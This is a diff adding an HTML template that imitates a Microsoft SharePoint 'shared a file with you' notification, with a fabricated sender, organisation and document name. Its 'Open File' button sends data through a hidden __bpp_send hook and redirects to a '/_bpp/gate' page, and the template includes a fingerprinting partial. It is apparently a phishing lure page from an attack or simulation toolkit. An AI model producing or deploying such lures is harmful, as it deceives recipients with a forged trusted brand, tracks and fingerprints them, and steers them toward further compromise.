@@ -1,0 +1,82 @@
+<!-- BPP-Template
+name: SharePoint Sharing
+description: File sharing notification from SharePoint with sender details
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>{{ file_name | default('Project_Proposal_v3.docx') }} - SharePoint</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box }
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #f6f6f6;
+      display: flex; align-items: center; justify-content: center;
+      min-height: 100vh;
+    }
+    .card {
+      background: #fff; border-radius: 8px;
+      box-shadow: 0 2px 16px rgba(0,0,0,.08);
+      max-width: 480px; width: 92%; overflow: hidden;
+    }
+    .top { background: #0078d4; padding: 20px 24px; color: #fff }
+    .top h1 { font-size: 18px; font-weight: 600 }
+    .body { padding: 24px }
+    .sender { display: flex; align-items: center; gap: 12px; margin-bottom: 20px }
+    .sender .av {
+      width: 40px; height: 40px; background: #8b5cf6;
+      border-radius: 50%; display: flex; align-items: center;
+      justify-content: center; color: #fff; font-weight: 600;
+    }
+    .sender .info span { display: block }
+    .sender .name { font-weight: 600; font-size: 14px }
+    .sender .org { font-size: 12px; color: #888 }
+    .file {
+      display: flex; align-items: center; gap: 12px;
+      background: #f9f9f9; border: 1px solid #eee;
+      border-radius: 8px; padding: 16px; margin-bottom: 20px;
+    }
+    .file-icon { font-size: 28px }
+    .file-name { font-size: 14px; font-weight: 600 }
+    .file-meta { font-size: 12px; color: #888 }
+    .btn {
+      display: block; width: 100%; padding: 14px;
+      background: #0078d4; color: #fff; border: none;
+      border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer;
+    }
+    .btn:hover { background: #106ebe }
+    .foot { padding: 16px 24px; font-size: 11px; color: #999; text-align: center;
+      border-top: 1px solid #eee }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="top">
+      <h1>&#x1f4c4; {{ sender | default('Alex Johnson') }} shared a file with you</h1>
+    </div>
+    <div class="body">
+      <div class="sender">
+        <div class="av">{{ (sender | default('Alex Johnson'))[0] | upper }}</div>
+        <div class="info">
+          <span class="name">{{ sender | default('Alex Johnson') }}</span>
+          <span class="org">{{ org_name | default('Contoso') }}</span>
+        </div>
+      </div>
+      <div class="file">
+        <span class="file-icon">&#x1f4c4;</span>
+        <div>
+          <div class="file-name">{{ file_name | default('Project_Proposal_v3.docx') }}</div>
+          <div class="file-meta">SharePoint &middot; Shared just now</div>
+        </div>
+      </div>
+      <button class="btn" onclick="window.__bpp_send(function(){ window.location.href='/_bpp/gate' })">
+        Open File
+      </button>
+    </div>
+    <div class="foot">{{ brand | default('Microsoft') }} SharePoint &middot; {{ org_name | default('Contoso') }}</div>
+  </div>
+  {% include '_fingerprint.html' %}
+</body>
+</html>
